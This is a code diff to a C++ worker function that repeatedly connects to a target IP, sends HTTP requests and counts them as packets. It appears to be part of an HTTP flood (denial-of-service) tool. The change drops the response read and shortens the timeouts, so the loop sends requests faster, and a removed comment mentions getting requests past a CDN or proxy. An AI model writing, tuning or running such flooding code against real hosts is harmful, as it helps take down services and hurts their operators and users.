@@ -343,8 +343,6 @@ static void worker_http(const std::string &method, const std::string &host, cons
     sin.sin_port = htons(port > 0 ? port : 80);
     inet_pton(AF_INET, target_ip.c_str(), &sin.sin_addr);
 
-    char recv_buf[1024];
-
     while (g_running.load(std::memory_order_relaxed)) {
         int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         if (sock < 0) {
@@ -352,17 +350,14 @@ static void worker_http(const std::string &method, const std::string &host, cons
             continue;
         }
 
-        struct timeval tv{2, 0};
+        struct timeval tv{1, 0};
         setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
         if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) == 0) {
             std::string req = build_http_request(method, host, path);
-            if (send(sock, req.c_str(), req.size(), MSG_NOSIGNAL) > 0) {
-                g_total_packets.fetch_add(1, std::memory_order_relaxed);
-                // Read response to ensure request is registered by CDN / proxy
-                recv(sock, recv_buf, sizeof(recv_buf), 0);
-            }
+            send(sock, req.c_str(), req.size(), MSG_NOSIGNAL);
+            g_total_packets.fetch_add(1, std::memory_order_relaxed);
         }
         close(sock);
     }
